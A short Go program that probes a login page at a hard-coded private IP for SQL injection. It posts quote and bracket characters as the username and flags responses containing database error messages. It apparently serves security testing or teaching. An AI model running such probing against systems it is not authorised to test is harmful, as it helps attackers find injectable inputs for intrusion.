package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"regexp"
)

func main() {
	payloads := []string{
		"baseline",
		")",
		"(",
		"\"",
		"'",
	}

	sqlErrors := []string{
		"SQL",
		"MySQL",
		"ORA-",
		"syntax",
	}

	errRegexes := []*regexp.Regexp{}
	for _, e := range sqlErrors {
		re := regexp.MustCompile(fmt.Sprintf(".*%s.*", e))
		errRegexes = append(errRegexes, re)
	}

	for _, payload := range payloads {
		client := new(http.Client)
		body := []byte(fmt.Sprintf("username=%s&password=p", payload))
		req, err := http.NewRequest(
			"POST",
			"http://172.18.29.133:8080/app/login.jsp",
			bytes.NewReader(body),
		)
		if err != nil {
			log.Fatalf("[!] unable to generate request: %s\n", err)
		}
		req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
		resp, err := client.Do(req)
		if err != nil {
			log.Fatalf("[!] unable to process response: %s\n", err)
		}
		body, err = ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Fatalf("[!] unable to read response body: %s\n", err)
		}
		resp.Body.Close()

		for idx, re := range errRegexes {
			if re.MatchString(string(body)) {
				fmt.Printf(
					"[+] SQL errors found ('%s') for payload: %s\n",
					sqlErrors[idx],
					payload,
				)
				break
			}
		}
	}
}
